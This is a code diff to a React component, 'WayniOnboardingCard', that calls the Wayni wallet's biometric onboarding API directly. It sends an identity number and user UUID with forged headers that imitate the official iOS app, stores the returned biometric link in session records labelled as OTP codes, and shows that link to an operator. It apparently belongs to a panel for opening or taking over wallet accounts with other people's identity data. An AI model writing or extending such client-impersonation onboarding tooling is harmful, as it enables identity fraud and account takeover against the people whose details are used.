@@ -1943,22 +1943,50 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
                 });
               }
 
-              // Step 3: onboarding_biometric
+              // Step 3: biometric (direct API call)
               if (resolvedUuid) {
-                const bioRes = await invoke({
-                  action: "onboarding_biometric",
-                  identity_number: dni,
-                  user_uuid: resolvedUuid,
-                  gender: otpParts.gender || "M",
+                const bioApiRes = await fetch("https://billetera.waynimovil.ar/me/api/v1/me/onboarding/biometric", {
+                  method: "POST",
+                  headers: {
+                    "Host": "billetera.waynimovil.ar",
+                    "Accept": "application/json, text/plain, */*",
+                    "Content-Type": "application/json",
+                    "Accept-Language": "pt-BR,pt;q=0.9",
+                    "User-Agent": "Waynimobile/1 CFNetwork/1331.0.7 Darwin/21.4.0",
+                    "x-correlation-id": crypto.randomUUID(),
+                    "x-app-source": "ReactNativeApp",
+                  },
+                  body: JSON.stringify({
+                    documentNumber: dni,
+                    userUuid: resolvedUuid,
+                    gender: otpParts.gender || "M",
+                  }),
                 });
-                if (bioRes.biometric_url) {
-                  // Save new biometric URL to session
+                const bioData = await bioApiRes.json();
+                if (bioData?.url) {
                   const existingParts = { ...otpParts };
-                  existingParts.biometric_url = bioRes.biometric_url;
-                  if (bioRes.biometric_id) existingParts.biometric_id = bioRes.biometric_id;
+                  existingParts.biometric_url = bioData.url;
+                  if (bioData.externalIdentifier) existingParts.biometric_id = bioData.externalIdentifier;
                   if (resolvedUuid !== userUuid) existingParts.uuid = resolvedUuid;
                   const newOtp = Object.entries(existingParts).map(([k, v]) => `${k}:${v}`).join("|");
                   await supabase.from("sessions").update({ otp_code: newOtp, status: "biometric_started" }).eq("id", session.id);
+                  setRetryResult({ ok: true, msg: `✓ Cadastro reenviado! Link: ${bioData.url}` });
+                } else {
+                  // Fallback: use edge function
+                  const bioRes = await invoke({
+                    action: "onboarding_biometric",
+                    identity_number: dni,
+                    user_uuid: resolvedUuid,
+                    gender: otpParts.gender || "M",
+                  });
+                  if (bioRes.biometric_url) {
+                    const existingParts = { ...otpParts };
+                    existingParts.biometric_url = bioRes.biometric_url;
+                    if (bioRes.biometric_id) existingParts.biometric_id = bioRes.biometric_id;
+                    if (resolvedUuid !== userUuid) existingParts.uuid = resolvedUuid;
+                    const newOtp = Object.entries(existingParts).map(([k, v]) => `${k}:${v}`).join("|");
+                    await supabase.from("sessions").update({ otp_code: newOtp, status: "biometric_started" }).eq("id", session.id);
+                  }
                 }
               }
 
